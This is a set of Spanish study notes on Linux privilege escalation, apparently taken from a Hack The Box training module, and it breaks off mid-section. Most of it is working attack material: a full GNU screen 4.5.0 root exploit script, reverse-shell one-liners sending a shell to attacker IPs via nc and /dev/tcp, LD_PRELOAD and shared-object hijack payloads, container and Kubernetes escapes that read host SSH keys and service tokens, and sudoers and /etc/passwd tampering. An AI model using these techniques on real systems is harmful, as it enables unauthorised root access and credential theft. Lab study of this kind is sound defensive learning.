# Comandos utiles para enumerar
```
ps aux | grep root

ps au

ls -l ~/.ssh

ls -la /home/

sudo -l

cat /etc/passwd

ls -la /etc/cron.daily/

lsblk

```

Buscar directorios editables:
```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

buscar archivos modificables:
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Para las flags:
```
grep -rnw "/" -e "HTB{" 2>/dev/null

o

find / -type f \( -name "*flag*" -o -name "*root*" \) -not -path "*/proc/*" -not -path "*/sys/*" -not -path "*/dev/*" 2>/dev/null
```
SON MUY BUENOS ESTOS DE ENUMERAR FLAGS Y BUSCAR ARCHIVOS !!

# Enviroment enumeration
```
cat /etc/os-release

env

echo $PATH

uname -a

lscpu

cat /etc/shells

lsblk

cat /etc/fstab

route

arp -a

cat /etc/passwd

cat /etc/passwd | cut -f1 -d:

grep "sh$" /etc/passwd

cat /etc/group

getent group sudo

df -h

cat /etc/fstab | grep -v "#" | column -t

ls -l /tmp /var/tmp /dev/shm
```

Archivos ocultos para un usuario:
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep [USERNAME]
```

Todos los directorios ocultos:
```
find / -type d -name ".*" -ls 2>/dev/null
```

## ESTA BASE ES DEMASIADO BUENA PARA BUSCAR ARCHIVOS  METER SI O SI A LOS APUNTES
```
find / -name "*.sh" 2>/dev/null | xargs cat | grep "HTB"
```

He probado tambien que va tambien muy muy bien:
```
find / -name "*.log" -type f -exec grep -Hia "HTB" {} + 2>/dev/null
```
# Enumeracion de servicios internos

```
ip a

cat /etc/hosts

lastlog

w        # Usuarios registrados

history

ls -la /etc/cron.daily/

find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

sudo -V

ls -l /bin /usr/bin/ /usr/sbin/

strace ping -c1 10.129.112.20

find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

ps aux | grep root
```

buscar arhcivos historicos:
```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

Buscar archivos de configuracion:
```
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

Buscar todas las versiones intaladas de una herramienta:
```
ls -l /usr/bin/[NOMBRE_HERRAMIENTA]*
```

# Busqueda de credenciales:
```
grep 'DB_USER\|DB_PASSWORD' wp-config.php

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

ls ~/.ssh
```

# Path Abuse (Hay que ver si lo tenemos y ponerlo bien o añadir lo que falte)

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.

        shellsession
`htb_student@NIX02:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games`

Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

        shellsession
`htb_student@NIX02:~$ pwd && conncheck  /usr/local/sbin Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd        tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd        tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2`

As shown below, the `conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.

        shellsession
`htb_student@NIX02:~$ pwd && conncheck  /tmp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd        tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd        tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2`

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

        shellsession
`htb_student@NIX02:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games`

        shellsession
`htb_student@NIX02:~$ PATH=.:${PATH} htb_student@NIX02:~$ export PATH htb_student@NIX02:~$ echo $PATH .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games`

In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

        shellsession
`htb_student@NIX02:~$ touch ls htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls htb_student@NIX02:~$ chmod +x ls`

        shellsession
`htb_student@NIX02:~$ ls PATH ABUSE!!`
# Wildcard Abuse (Este igual revisar y si no lo tenemos ñlo añadimos)

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|
Un ejemplo de cómo se pueden usar comodines para escalar privilegios es el `tar`comando, un programa común para crear/extraer archivos. Si consultamos la [página de manual](http://man7.org/linux/man-pages/man1/tar.1.html) del `tar`comando, vemos lo siguiente:
```
htb_student@NIX02:~$ man tar <SNIP> Informative output --checkpoint[=N] Display progress messages every Nth record (default 10). --checkpoint-action=ACTION Run ACTION on each checkpoint.
```

Esta `--checkpoint-action`opción permite `EXEC`ejecutar una acción al alcanzar un punto de control (es decir, ejecutar un comando arbitrario del sistema operativo una vez que se ejecuta el comando tar). Al crear archivos con estos nombres, cuando se especifica el comodín, `--checkpoint=1`se `--checkpoint-action=exec=sh root.sh`pasa `tar`como opción de línea de comandos. Veamos esto en la práctica.

Consideremos la siguiente tarea programada (cron job), que está configurada para realizar una copia de seguridad del `/home/htb-student`contenido del directorio y crear un archivo comprimido `/home/htb-student`. La tarea programada se ejecuta cada minuto, por lo que es una buena candidata para la escalada de privilegios.
```
# # mh dom mon dow command */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

```
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh" htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Podemos comprobar que se han creado los archivos necesarios.
```
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```
Una vez que se ejecute de nuevo la tarea programada (cron job), podremos comprobar los privilegios de sudo recién añadidos y acceder directamente al usuario root mediante sudo.

```
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

# Escapando de shells restringidas
Las shells restringidas se suelen encontrar en entornos emrpesariales para garantizar la seguridad de los activos.
Para escapar de ellas hay varais formas vamos a ver algunos comandos y veremos que se usa:
#### Command injection
```
ls -l `pwd`
```
#### Command Substitution
#### Command Chaining
```
:

|
```
#### Environment Variables
#### Shell Functions

Todos estos basicamente podemos fijarnos en el apartado de command inyection en los aputnes , hay que meter referencia.

## LA FORMA MAS FACIL DE SALTARSE LAS RESTRICCIONES MUYY IMPORTANTE ESTA PARTE!!
https://vk9-sec.com/linux-restricted-shell-bypass/
La más rápida a probar es ejecutar el ssh directamente con:
```
ssh [USUARIO]@[IP] -t "bash --noprofile"
```
Esto nos dará una shell sin restricciones

Otra manera una vez estamos dentro y no funciona lo anterior o no podemos hacerlo podemos hacer lo siguiente:
```
echo *  # Este sustituye al ls

read line < [NOMBRE_ARCHIVO]; echo $line # Este sustituye al cat
```

# Para enumerar permisos
El primero de siempre sudo:
```
sudo -l
o
sudo -u [USUARIO] -l
```

para permisos SUID:
```
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

para los permisos SGID que son como los SUID pero con el bit de grupo activo para escalar a dicho grupo y de ahí pivotar:
```
find / -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
>[!Note]
>Si estos entre el `/` y el `-perm` le metemos `-user root` los sacaremos para ese usuario

## Ejemplo de abuso de sudo que no está en GFOBins mostrado en HTB:
```
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

Y entonces ve:
```
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrotate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

Por lo que después hace:
```
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Y lo prueba:
```
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Por lo que ve que funciona, por lo cual abre una terminal nueva y deja nc a la escucha y repite:
```
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

Y le da la conexión en nc:
```
Olvidix@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```
# Grupos privilegiados
## LXC / LXD
Estos son similares a contenedores de docker y siempre tendrá privilegios sobre el contenedor.
```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Una vez comprobamos descomprimimos el contenedor:
```
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Y lo iniciamos con `lxd init`

Importamos después la imagen local:
```
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Una vez todo creado y configurado podemos iniciarla con privilegios elevados:
```
lxc init alpine r00t -c security.privileged=true
```

Y después podemos vern archivos de la maquina host, para ello vamos a montar su sistema de archivos con:
```
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Y despues abrimos una instancia y podremos ver los archivos de root con un usuario que no deberia:
```
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```

### Mas ataques con estos contenedores
Linux Daemon ( [LXD](https://github.com/lxc/lxd) ) es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicaciones, sino un contenedor de sistema.

Confirmamos que somos de ese grupo:
```
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
A partir de aquí, existen varias formas de explotar LXCla vulnerabilidad LXD. Podemos crear nuestro propio contenedor y transferirlo al sistema objetivo o utilizar uno ya existente.

```
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

```
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```
 Tras verificarlo que se ha instalado podemos iniciarla:
 ```
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
Y montar el sistema de archivos:
```
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash  # o puede ser /bin/sh
root@nix02:~# ls -l /mnt/root
```
Y ya podremos ver los archivos de root

## Docker
```
docker run -v /root:/mnt -it ubuntu
```
Este comando crea una nueva instancia de Docker con el directorio `/root` del sistema de archivos del host montado como un volumen.

### Ataque de directorios compartidos
Cuando accedemos al contenedor Docker y lo analizamos localmente, podemos encontrar directorios adicionales (no estándar) en el sistema de archivos de Docker.
```
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
```
### Ataque de sockets
Encontramos un socket:
```
htb-student@container:~/app$ ls -la

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

Para interactuar con el socket necesitaremos el binario de docker:
https://master.dockerproject.com/linux/x86_64/docker

Y entonces:
```
htb-student@container:/tmp$ wget https://KALI:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
```
Y ya podremos:
```
/tmp/docker -H unix:///app/docker.sock ps
```
Copiamos todos los archivos:
```
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
```
Y ya podremos ver todo:
```
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
```

#### Otro ataque a socket
Otro caso que puede darse es cuando el socket de Docker es escribible. Normalmente, este socket se encuentra en `/var/run/docker.sock`. Sin embargo, la ubicación puede variar. Básicamente, solo el usuario root o el grupo docker pueden escribir en él. Si actuamos como un usuario que no pertenece a ninguno de estos dos grupos, y el socket de Docker aún conserva los privilegios de escritura, podemos aprovechar esta situación para escalar nuestros privilegios.

```
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
```

### Revision de grupo
Si estamos en el grupo docker:
```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

```
docker image ls
```
Para ver las imagenes
## Disk
Los usuarios del grupo de discos tienen acceso completo a todos los dispositivos que contiene /dev, como /dev/sda1el disco principal del sistema operativo. Un atacante con estos privilegios puede debugfsacceder a todo el sistema de archivos con privilegios de administrador. Al igual que en el ejemplo del grupo de Docker, esto podría utilizarse para obtener claves SSH, credenciales o para añadir un usuario.

## ADM
Los miembros del grupo adm pueden leer todos los registros almacenados en `/var/log`

# Capabilities (Meter lo que no tengamos o ampliar con algun comando nuevo)

Para enumerar capabilities:
```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Ejemplo:
```
Olvidix@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```
Se ejecuta sin privilegios especiales de sudo.

Entonces podemos usar esa capabilitie de override:
```
/usr/bin/vim.basic /etc/passwd
```
o en vez de modo interactivo podemos :
```
Olvidix@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
Olvidix@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Ahora podemos ver que el `x`en esa línea ha desaparecido, lo que significa que podemos usar el comando `su`para iniciar sesión como root sin que se nos pida la contraseña.

AQUI HAY QUE VER LO QUE YA TENIAMOS YA QUE EL METODO NO ESTA EXPLCIADO MUY BIEN , PREGUNTAME AQUI LO QUE TENGAS QUE PREGUNTARME CUANDO LO LEAS

# Servicios vulnerables
```
screen -v

./screen_exploit.sh
```
#### Screen_Exploit_POC.sh
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
	execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

# Abuso de CronJob
Buscar cronjobs:
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

La cosa seria poder encontrar uno con un scirpt que podamos modificar y meterle al final:
```
bash -i >& /dev/tcp/[IP_KALI]/443 0>&1
```

Usar pspy64 para ver mas información de lo que ocurre, esto ya estaba en los apuntes.

# Kubernetes (K8s)
```
kubeletctl -i --server 10.129.10.11 pods

kubeletctl -i --server 10.129.10.11 scan rce

kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

## Escalada de privilegios
```
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

```
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
```

```
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources   Non-Resource URLs   Resource Names   Verbs 
```
A partir de aqui, se supone aunque esto nos e prueba en el modulo asi que habra que hacer algo de teoria/practica por si las moscas, haremos un pod YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
Una vez creado hacemos un  nuevo pod:
```
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME    READY   STATUS  RESTARTS    AGE
nginx   1/1     Running 0           23m
privesc 1/1     Running 0           12s
```

Si todo salió correcto podremos ejecutar comandos:
```
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```

# Logrotate
Cada sistema Linux genera grandes cantidades de archivos de registro. Para evitar que el disco duro se sature, una herramienta llamada `logrotate`se encarga de archivar o eliminar los registros antiguos.
Esta herramienta se suele iniciar periódicamente mediante `cron`y se controla mediante el archivo de configuración `/etc/logrotate.conf`. Dentro de este archivo, se encuentran ajustes globales que determinan la función de `logrotate`.

Para forzar a que se ejecute el mismo día podremos cambiar `/var/lib/logrotate.status` o usar la opción  `-f` o `--force` :
```
Olvidix@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

Podemos encontrar los archivos de configuración correspondientes en `/etc/logrotate.d/`el directorio.
```
Olvidix@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```
Olvidix@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

## Ataque a logrotate
Para explotarlo `logrotate`, necesitamos cumplir con algunos requisitos.

1. Necesitamos `write`permisos en los archivos de registro.
2. logrotate debe ejecutarse como un usuario privilegiado o`root`
3. versiones vulnerables:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

```
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```
>[!Note]
>Lo mejor es compilarlo directamente en la victima por que puede dar errores si no por versiones

Necesitaremos un payload vamos a hacerlo antes de nada:
```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Pero antes de ejecutar el exploit necesitamos saber la opción que tiene logrotate:
```
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```
Es create, por lo que vamos a usarlo adaptado a esta función

Primero nos ponemos a la escucha en otra pestaña:
```
nc -nlvp 9001
```

Y lo ejecutamos:
```
./logrotten -p ./payload [RUTA_DE_"cat /var/lib/logrotate.status"]
```
Se quedara a la escucha

y lo triggeamos:
```
echo "test" >> [RUTA_DE_"cat /var/lib/logrotate.status"]
```

Para ver una que rota es con:
```
cat /var/lib/logrotate.status
```
Y de ahi cualquiera de lo que nos sale

Yo en el ejemplo para triggearlo una vez mas y que se ejecutara como que tuve que forzar un error en bash por que se escribia en ese log. lo mejor es consultarlo con la IA de confianza y ya yo creo

Y listo obtendremos nuestra shell

# Miscelanea
## TCPdump
Si `tcpdump`está instalado, los usuarios sin privilegios podrían capturar el tráfico de red, incluyendo, en algunos casos, credenciales transmitidas en texto plano. Existen varias herramientas, como [net-creds](https://github.com/DanMcInerney/net-creds) y [PCredz](https://github.com/lgandx/PCredz) , que permiten examinar los datos transmitidos.

## Privilegios débiles en NFS
```
Olvidix@htb[/htb]$ showmount -e [IP_VICTIMA]

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```
Importante revisar que hay dos por que a veces falla por permisos en el ataque y necesitamos otra para probar ahí también.

Suelen haber dos configuraciones:

|Opción|Descripción|
|---|---|
|`root_squash`|Si se utiliza el usuario root para acceder a recursos compartidos NFS, se cambiará al `nfsnobody`usuario normal, que es una cuenta sin privilegios. Todos los archivos creados y subidos por el usuario root serán propiedad de este `nfsnobody`usuario, lo que impide que un atacante suba binarios con el bit SUID activado.|
|`no_root_squash`|Los usuarios remotos que se conecten al recurso compartido como usuario root local podrán crear archivos en el servidor NFS como usuario root. Esto permitiría la creación de scripts o programas maliciosos con el bit SUID activado.|

Podemos ver la de ese server con: `cat /etc/exports`

### Ataque de NFS
Creamos un binario `shell.c`
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
Compilamos preferiblemente en la victima para que no de errores:
```
gcc shell.c -o shell
```
Y lo movemos a una de sus rutas nfs

Desde la kali:
```
root@Pwnbox:/tmp$ sudo mount -t nfs [IP_VICTIMA]:/tmp /mnt
root@Pwnbox:/tmp$ cd /mnt
```
Desde ahí ya veríamos la shell compilada, ahora le damos la bendición de root:

```
chown root:root /mnt/shell_root
chmod 4755 /mnt/shell_root
```

Cuando volvemos a la sesión con privilegios bajos del host, podemos ejecutar el binario y obtener una consola de root.
```
htb@NIX02:/tmp$ ./shell
```

==Esto esta super interesante!!!==
## Secuestro de sesiones Tmux
Alguien para configurar tmux (Para este ejemplo) puso esto:
```
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

### Ataque
Primero vemos si hay sesiones de tmux como root
```
ps aux | grep tmux
```

Después confirmamos los permisos (deben de ser srw-rw----):
```
ls -la /shareds
```

Y confirmamos que pertenecemos al grupo devs con `id`

Por lo que si nos conectamos a esa sesión con:
```
tmux -S /shareds
```
tendremos permisos de root

Esto pasa por que alguien se dejo alguna terminal de tmux corriendo con algún proceso y nos aprovechamos de ello

# Exploits de kernels
Lo pasa por encima, uno muy famoso es el dirty cow:
https://github.com/dirtycow/dirtycow.github.io

Y el que ponen de ejemplo es una poc de un exploit de linux (Ubuntu 16.04.4)
https://github.com/briskets/CVE-2021-3493
Super sencillo, descargas , compilas , y root no tiene nada mas

# Shared libraries (Library hijacking)
Para enumerar las bibliotecas de un binario:
```
ldd [RUTA_AL_BINARIO]
```

Podemos aprovechar esta vulnerabilidad cuando al poner sudo -l nos da un `LD_PRELOAD`, por lo que podemos hacer el ataque.

Para ello tenemos que crear nuestro binario, por lo que he visto se pueden varios:
	1.
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
	2. Mi preferida
```
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
	3.
```
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(geteuid()); setgid(getegid()); execl("/bin/sh","sh",NULL); }
```

Una vez creado nuestro binario compilamos:
```
gcc -fPIC -shared -o [NOMBRE].so [NOMBRE].c -nostartfiles
```

Y ejecutamos el permiso que teníamos de sudoers con este nuevo:
```
sudo LD_PRELOAD=[RUTA_AL_ARCHIVO.SO] [RUTA_AL_BINARIO_DE_SUDOERS]
```
# Shared Object Hijacking
Hya programas y vinarios con bibliotecas personalizadas, veamos esta con SETUID:
```
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Podemos usar ldd para mostrar la ubicación exacta:
```
ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
Vemos una libreria rara la de libshared.so, si tiene RUNPATH de opcion podremos hacer el ataque:
```
readelf -d payroll | grep PATH

0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Vemos que lo tiene por lo que vamos al ataque. Este en concreto permite cargar bibliotecas desde /development.
Ahora que sabemos el binario y la ruta nos quedaría encontrar el nombre de la función que llama el binario, para ello vamos a forzarlo con un error. Como vimos que la del binario es `libshared.so` vamos a reemplazarla y forzarlo usando una librería legítima como `/lib/x86_64-linux-gnu/libc.so.6`:
```
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```
Con esto al usar el programa forzara el error que nos queda:
```
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```
La función que falta es dbquery
Y con esto ya tenemos las tres cosas necesarias ahora vamos al lio. Creamos la función maliciosa (Tenemos opciones):
	1.
```shell
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
	2.
```shell
#include <stdlib.h>
#include <unistd.h>
void dbquery() {
    setuid(0);
    system("/bin/sh -p");
}
```

Y compilamos:
```
